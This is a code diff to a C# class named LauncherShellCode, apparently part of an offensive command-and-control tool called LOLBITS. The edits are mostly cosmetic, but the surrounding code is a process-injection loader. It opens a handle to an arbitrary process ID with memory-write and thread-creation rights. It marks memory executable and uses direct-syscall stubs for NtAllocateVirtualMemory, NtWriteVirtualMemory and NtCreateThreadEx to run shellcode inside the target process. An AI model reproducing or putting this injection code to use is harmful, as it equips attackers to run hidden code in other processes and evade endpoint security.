@@ -8,6 +8,7 @@ namespace LOLBITS.Controlling
 {
     public class LauncherShellCode
     {
+        /////////////////////////// ENUM ///////////////////////////
         [Flags]
         public enum AllocationType : uint
         {
@@ -41,6 +42,8 @@ namespace LOLBITS.Controlling
             MemDeCommit = 0x4000,
             MemRelease = 0x8000
         }
+
+        /////////////////////////// Struct ///////////////////////////
 
         public unsafe struct MyBuffer32
         {
@@ -80,22 +83,46 @@ namespace LOLBITS.Controlling
             public long Unknown6;
         }
 
+        /////////////////////////// PInvoke ///////////////////////////
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType lAllocationType, MemoryProtection flProtect);
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtAllocateVirtualMemory(IntPtr processHandle, out IntPtr baseAddress, uint zeroBits, out UIntPtr regionSize, AllocationType allocationType, MemoryProtection protect);
+        /////////////////////////// Native Syscall ///////////////////////////
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
+        public delegate int NtAllocateVirtualMemory(IntPtr processHandle, out IntPtr baseAddress, uint zeroBits, out UIntPtr regionSize, AllocationType allocationType, MemoryProtection protect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        internal delegate int NtCreateThreadEx32(out IntPtr hThread, Int32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool createSuspended,
-            uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, out Unknown32 lpBytesBuffer);
+        public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtCreateThreadEx32(
+            out IntPtr hThread,
+            int desiredAccess,
+            IntPtr objectAttributes,
+            IntPtr processHandle,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            bool createSuspended,
+            uint stackZeroBits,
+            uint sizeOfStackCommit,
+            uint sizeOfStackReserve,
+            out Unknown32 lpBytesBuffer);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expect different kind of parameters for 32 and 64 bits procesess. 
-        private delegate int NtCreateThreadEx64(out IntPtr hThread, long desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool createSuspended,
-            ulong stackZeroBits, ulong sizeOfStackCommit, ulong sizeOfStackReserve, out Unknown64 lpBytesBuffer);
+        public delegate int NtCreateThreadEx64(
+            out IntPtr hThread,
+            long desiredAccess,
+            IntPtr objectAttributes,
+            IntPtr processHandle,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter, 
+            bool createSuspended,
+            ulong stackZeroBits,
+            ulong sizeOfStackCommit,
+            ulong sizeOfStackReserve, 
+            out Unknown64 lpBytesBuffer);
 
 
         public static void Main(byte[] shellCode, SysCallManager sysCall, int pid)
@@ -127,7 +154,8 @@ namespace LOLBITS.Controlling
                 Utils.EnablePrivileges(token, l);
 
                 Utils.GetProcessHandle(pid, out handle, Utils.ProcessAccessFlags.CreateThread | Utils.ProcessAccessFlags.QueryInformation | 
-                                                        Utils.ProcessAccessFlags.VirtualMemoryOperation | Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead, sysCall);
+                                                        Utils.ProcessAccessFlags.VirtualMemoryOperation | 
+                                                        Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead, sysCall);
             }
 
             try
@@ -152,8 +180,7 @@ namespace LOLBITS.Controlling
                 baseAddress = (IntPtr) arguments[1]; //required!
 
                 shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
-                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
-                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
+                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
                 Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                 sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
 
@@ -179,8 +206,7 @@ namespace LOLBITS.Controlling
                 u.Unknown3 = 0;
 
                 shellCode = sysCall.GetSysCallAsm("NtCreateThreadEx");
-                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
-                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
+                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
                 Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                 sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtCreateThreadEx64));
 
